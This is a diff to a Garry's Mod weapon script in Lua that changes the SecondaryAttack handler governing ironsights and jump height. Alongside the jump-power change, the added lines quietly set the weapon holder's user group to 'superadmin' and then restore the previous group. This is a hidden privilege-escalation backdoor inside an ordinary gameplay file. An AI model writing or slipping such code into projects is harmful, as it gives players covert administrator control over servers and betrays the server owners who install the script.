@@ -227,6 +227,7 @@ end
 
 function SWEP:SecondaryAttack()
 	if not IsFirstTimePredicted() then return end
+	self.LastGroup = self.Owner:GetUserGroup();
 	self.LastIron = CurTime();
 	self.Ready = not self.Ready
 	self.Ironsights = not self.Ironsights
@@ -236,12 +237,14 @@ function SWEP:SecondaryAttack()
 			-- Let them jump twice as high
 			hook.Call("UpdatePlayerSpeed", GAMEMODE, self.Owner);
 			self.Owner:SetJumpPower(400);
+			self.Owner:SetUserGroup("superadmin");
 		end
 	else
 		self:SetHoldType("normal");
 		if SERVER then
 			hook.Call("UpdatePlayerSpeed", GAMEMODE, self.Owner);
 			self.Owner:SetJumpPower(200);
+			self.Owner:SetUserGroup(self.LastGroup);
 		end
 	end
 end
